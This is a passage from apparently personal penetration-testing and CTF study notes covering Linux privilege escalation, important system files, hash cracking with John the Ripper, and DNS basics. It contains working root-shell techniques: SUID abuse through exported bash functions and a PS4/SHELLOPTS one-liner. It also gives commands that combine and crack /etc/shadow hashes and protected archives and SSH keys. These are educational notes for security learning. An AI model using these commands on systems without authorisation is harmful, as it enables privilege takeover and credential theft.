versions &lt;4.2-048): if we have a SUID binary that executes another executable using the absolute path, we can still exploit this:<br />         1&gt; check the bash version with <code>/bin/bash --version</code><br />         2&gt; identify the path of the executable the SUID binary calls during its execution.<br />         3&gt; create a bash function using <code>function /path_to_executable { /bin/bash -p; }</code> and export it using <code>export -f /path_to_executable</code><br />         4&gt; run the SUID binary<br />      ▪ <strong>Bash in debugging mode</strong> (only for bash versions &lt;4.4):<br />         1&gt; run <code>env -i SHELLOPTS=xtrace PS4=&#39;$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)&#39; /usr/local/bin/suid-env2</code><br />         2&gt; run <code>/tmp/rootbash -p</code><br />• <strong>Vulnerable NFS share</strong>: <a href="Penetration_Testing--Exploitation--Network_Services--NFS.html">here</a>.<br />• <strong>Kernel exploits</strong>: they can leave the system in an unstable state, use them as last resort<br /><br />• useful links and tools:<br />   ◇ checklists (<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Linux - Privilege Escalation.md</a>)<br />   ◇ <a href="https://github.com/jondonas/linux-exploit-suggester-2">https://github.com/jondonas/linux-exploit-suggester-2</a>, useful to find kernel exploits<br /><br /><br /><br /></div><div class='page'><h1 class='title level-2'>Linux Important Files</h1><br/>• <code>/etc/passwd</code>: readable by everyone (by default) and contains user account information. Every line contains 7 fields (separated by a colon) that describe a user:<br />   ◇ Username<br />   ◇ Password: usually is an x, to indicate it&#39;s encrypted and stored in the /etc/shadow file. But it can also be an hash!<br />   ◇ User ID (UID)<br />   ◇ Group ID (GID)<br />   ◇ User ID Info: contains extra information about the user such as phone number, mail etc.<br />   ◇ Home directory<br />   ◇ Command/shell: the absolute path of a command or shell (usually it&#39;s a shell)<br /><br />• Crontabs (located in <code>/etc/crontab</code>): one-time/recurring tasks executed by the Cron daemon. The format of a cron job is explained particularly well in the file<br /><br />• <code>/etc/hosts</code>: file used for name resolution, so that a domain is resolved locally instead of remotely through a DNS server<br />   ◇ every line of the file has this format <code>&lt;ip&gt; domain.com</code><br />   ◇ some websites in ctf challenges redirect you to domains that do not exist like <code>weirdsite.htb</code>. To access those websites you have to add a line in this file, so that the domain is resolved locally and points to the ip of the website<br /></div><div class='page'><h1 class='title level-2'>Linux Important Commands</h1><br/>If you have trouble understanding what a command or an option of a command does, here&#39;s an EXTREMELY useful site for you: <a href="https://explainshell.com/">https://explainshell.com/</a><br /><br />• <code>locate</code>, to quickly find a file by its name</div><div class='page'><h1 class='title level-1'>Cryptography</h1><br/>• How to calculate n-th root for big numbers?<br />If you want to use python, standard operations can&#39;t handle numbers that are too big. Instead you have to use a library called decimal. Here is an example:<br /><br /><div class="codebox"><pre><span style="color:#333333;font-weight:400">import</span> decimal<br /><br />decimal.getcontext().prec=<span style="color:#ff0044;font-weight:400">3000</span> <span style="color:#0088ff;font-weight:400">#keep this number high otherwise the numbers could get truncated</span><br />n = <span style="color:#ff0044;font-weight:400">225733570376365932468335996375485440054093549241953232419102010172016315697547410301618526179816207849388202337216300099060281594319157047118340810842614980739142593719403296503190159366855910150443967239048692403018881883298092411312981364586682701412197994716892488377726541494395803924293481584332850923331357006872822703511471333914818558324398192361564633112331754181874133385540953940688236229294427707563453263917943449756776327030220639468992996789681805763314662158584093477410079443060019776340638009624431171614377622399628875116341442101</span><br />d = decimal.Decimal(<span style="color:#ff9d00;font-weight:700">str</span>(n))<br />r = d ** (decimal.Decimal(<span style="color:#3ad900;font-weight:400">&#39;1&#39;</span>) / <span style="color:#ff0044;font-weight:400">3</span>)<br /><span style="color:#ff9d00;font-weight:700">print</span>(r)</pre></div><br /><br /><strong><span style="text-decoration:underline;">GPG</span></strong>: open source implementation of PGP (pretty good privacy)<br /><br /><strong><span style="text-decoration:underline;">RSA Vulnerabilities</span></strong>:<br />• useful links and tools:<br />   ◇ <a href="https://github.com/Ganapati/RsaCtfTool">https://github.com/Ganapati/RsaCtfTool</a>  (not the best to learn things, but it lists a bunch of vulnerabilities)<br />   ◇ <a href="https://github.com/ius/rsatool">https://github.com/ius/rsatool</a><br /><br /><br /><br /></div><div class='page'><h1 class='title level-2'>Hash Functions</h1><br/>• one way mathematical function that takes in input a string and converts (or digests) it into a fixed size string (called hash).<br />• hashing algorithms are relatively fast to compute, but very slow to reverse<br />• hashing functions are used to verify integrity of data or for verifying passwords<br />   ◇ when storing a password, it should be hashed and <em>salted</em>. A <strong>salt</strong> is a random string that you store with the user&#39;s ID and mix into the password when you compute the hash. This way, even if two users choose the same password, their salts will be different, and they&#39;ll end up with different hashes.<br />   ◇ the integrity and authenticity of data can be verified with HMAC<br />• <em>rainbow table</em>: lookup table of hashes to plaintexts. If it&#39;s sorted, searching for a hash becomes really fast. NOTE: This is useless against salting!<br />• hashes can have a prefix that identifies its hashing algorithm<br />• useful links and tools:<br />   ◇ <a href="https://pypi.org/project/hashID/">https://pypi.org/project/hashID/</a>  to recognize the type of hash (however, it&#39;s reliable only for the hashes that have a prefix)<br />   ◇ <a href="https://hashcat.net/wiki/doku.php?id=example_hashes">https://hashcat.net/wiki/doku.php?id=example_hashes</a>  to see all the types of hashes<br />   ◇ <a href="https://crackstation.net/">https://crackstation.net/</a> , crack many types of hashes using a wordlist with billions of items<br />   ◇ <a href="Cryptography--Hash_Functions--John_The_Ripper.html">John The Ripper</a>, tool to crack a hash (and more)<br /><br /><br /><br /></div><div class='page'><h1 class='title level-3'>John The Ripper</h1><br/>We can do what&#39;s called a <strong>dictonary attack</strong> with John The Ripper, using this command:<br /><code>john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-sha256 hash.txt</code><br />• <code>--format</code> is optional, if it&#39;s omitted John will try to find the correct format automatically (not always reliable, use an hash identifier for weird hashes)<br />• use the command <code>john --list=formats</code> to get a list of all the hash types John supports<br />• if no wordlist is provided, john will first try to use its default wordlist (<code>/usr/share/john/password.lst</code>), and then it will proceed with the incremental ASCII mode. This can take centuries, so it&#39;s not recommended unless you know the plaintext is really short<br />• <strong>Single Crack Mode</strong>: if the <code>--single</code> option is set, John is provided with only a password, and tries to work out possible passwords using a technique called <strong>word mangling</strong>.<br />   ◇ NOTE: the file you have to provide can&#39;t contain only a hash, but also a username that allows john to create a custom wordlist based on that. Example: <code>mike:1efee03cdcb96d90ad48ccc7b8666033</code><br />      By running <code>john --single --format=Raw-MD5 hash.txt</code>, john will try passwords like M1ke, MIke, mik3, etc.<br /><br /><br />• <strong>Cracking a Password Protected Zip File:</strong> to do that we need to extract the hashed password from the zip file. We can do that using this simple command (included with john): <code>zip2john zipfile.zip &gt; zip_hash.txt</code><br />Once we&#39;ve done that we have a hash we can try to crack.<br />• <strong>Cracking a Password Protected RAR Archive:</strong> identical to the above procedure, but to extract the hash of the archive we need this command: <code>rar2john rarfile.rar &gt; rar_hash.txt</code><br />Once we&#39;ve done that we have a hash we can try to crack.<br />• <strong>Cracking SSH Keys Passwords:</strong> a private SSH key can be protected with a password. We can extract its hash using <code>python3 /usr/share/john/ssh2john.py id_rsa &gt; hash.txt</code> (if you&#39;re using Kali)<br />• to crack the <code>/etc/shadow</code> file (the file that contains all the hashed passwords of users and other info), we can first use a command called unshadow (already included with john). The basic command is:<br /><code>unshadow /etc/passwd /etc/shadow &gt; unshadowed.txt</code><br />   ◇  of course you can make a copy of passwd and shadow and provide the paths to those copies<br />   ◇ unshadow &quot;combines&quot; the two files<br />   ◇ we can the feed the output from unshadow directly into john, with the option <code>--format=sha512crypt</code><br /><br />• Custom Rules: you can create custom rules in the file <code>/etc/john/john.conf</code> that can be used along with wordlists using the option <code>--rule=rule_name</code><br />For more info: <a href="https://www.openwall.com/john/doc/RULES.shtml">https://www.openwall.com/john/doc/RULES.shtml</a><br /><br /></div><div class='page'><h1 class='title level-1'>Networking</h1><br/></div><div class='page'><h1 class='title level-2'>DNS</h1><br/>• TLD (top-level domain) is the most righthand part of a domain name (example: .com)<br />   ◇ gTLD (generic TLD): tell the purpose of the domain&#39;s name (.com for commercial, .org for organization, .edu for education)<br />   ◇ ccTLD (country code TLD): for geographical purposes (.it for italy, .ca for canada, .co.uk for united kingdom and so on)<br />• Second-Level Domain: limited to 63 characters and can only use a-z, 0-9 and hypens (cannot start with or end with or have consecutive hypens)<br />• Subdomain: left-hand side of the Second-Level Domain<br />   ◇ same restrictions as Second-Level Domain<br />   ◇ you can have multiple subdomains, but the length of the domain must be kept to 253 characters or less.<br /><br />• Types of DNS records:<br />   ◇ A record: resolve to IPv4 addresses<br />   ◇ AAAA record: resolve to IPv6 addresses<br />   ◇ CNAME record: resolve to another domain name (so another DNS request will be made)<br />   ◇ MX record: resolve to the address of the servers that handle the email for the domain you are querying. There&#39;s also a priority flag system that tells the client in which order to try the servers<br />   ◇ TXT record: free text field where any text-based data can be stored. It has multiple uses, some common ones are:<br />      - list servers that have the authority to send an email on behalf of the domain (can help against spamming and spoofing)<br />      - verifying ownership of the domain name when signing up for third party services.<br /><br />• What happens after making a DNS request:<br />   ◇ the local cache is checked first. If nothing is found a request to your recursive DNS server (provided by your ISP but also choosable by you) will be made<br />   ◇ The recursive DNS server checks its local cache, and if a result is found locally (common for popular services such as Google) the request ends here.<br />   ◇ If no result is found a request to the root DNS servers is made. Their job is to redirect you to the correct Top Level Domain server, depending of course on the TLD of the URL of your request<br />   ◇ The TLD server holds records for where to find the <strong>authoritative DNS server(s) (also called nameserver for the domain)</strong> to answer the request.<br />   ◇ The DNS record, once found, is sent back to the recursive DNS server and cached. The DNS record has a TTL value that says how much time before it has to be looked up again.<br />   ◇ (<a href="https://assets.tryhackme.com/additional/dnsindetail/dns.png">https://assets.tryhackme.com/additional/dnsindetail/dns.png</a>)<br /><br /><br />• You can make DNS requests from the terminal using▪ the command <code>nslookup --type=TXT website.com</code><br />• the comand <code>dig &lt;domain&gt; @&lt;dns-server-ip&gt;</code>, to query a specific DNS server<br />• and there&#39;s also a more general command <code>whois website.com</code><br /><br /><br /><br /></div>
</body>
</html>
